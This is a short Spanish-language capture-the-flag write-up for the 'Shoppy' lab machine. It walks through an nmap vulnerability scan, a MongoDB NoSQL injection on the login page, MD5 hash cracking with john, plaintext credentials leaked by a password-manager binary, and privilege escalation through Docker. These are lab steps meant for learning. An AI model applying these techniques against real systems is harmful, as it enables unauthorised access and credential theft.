# ShoppyWriteup

Este fue mi primer writeup

~~~
nmap -v -sS -oX vulnerabilidades.xml --stylesheet=https://svn.nmap.org/nmap/docs/nmap.xsl --script=vuln 10.10.11.180
~~~

![imagen](https://github.com/Hamibubu/ShoppyWriteup/assets/108554878/ad5c508c-f85f-4d92-b859-11c3451bac18)

Nmap nos dice que está el puerto 80, entonces entramos y hay un login
Pero antes editamos los hosts para entrar

~~~
sudo nano /etc/hosts
~~~
![imagen](https://github.com/Hamibubu/ShoppyWriteup/assets/108554878/e4f934a0-984a-4c91-8c00-611e6a36803d)

Ahora si entramos y calamos un slq injection básico

![imagen](https://github.com/Hamibubu/ShoppyWriteup/assets/108554878/f42fa178-2421-4231-a7cd-5b3e4498be26)

Usamos sqlinjection

Pero no jala con la normal, investigamos y descubrimos

Esta es mongo

![imagen](https://github.com/Hamibubu/ShoppyWriteup/assets/108554878/e51aa0d8-1f93-4366-b71a-e80a3e255367)

Entramos y vemos admin

Sacamos la contra que esta con md5, esa es la de admin, falta de le josh que es otro user

~~~
┌──(kali㉿kali)-[~]
└─$ sudo john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.md5 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2022-11-01 21:44) 0g/s 20787Kp/s 20787Kc/s 20787KC/s  fuckyooh21..*7¡Vamos!

~~~

## Escalar privilegios

Vemos un password manager

~~~
jaeger@shoppy:/home/deploy$ sudo -u  deploy /home/deploy/password-manager
[sudo] password for jaeger: 
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
jaeger@shoppy:/home/deploy$ su deploy
Password: 
$ ls
creds.txt  password-manager  password-manager.cpp
$ cat cred
cat: cred: No such file or directory
$ cat creds.txt
Deploy Creds :
username: deploy
password: Deploying@pp!
~~~

Conseguimos las creds

Corremos con docker

~~~       
$ docker run -di --name flast101 alpine:latest
53d650ce3ac0a77c2516cf21fc171f2ed443779bb1a8112a7ba05931edbf1bc9
$ docker exec -ti flast101 sh
/ # ls
bin    dev    etc    home   lib    media  mnt    opt    proc   root   run    sbin   srv    sys    tmp    usr    var
/ # whoami
root
~~~

Listo


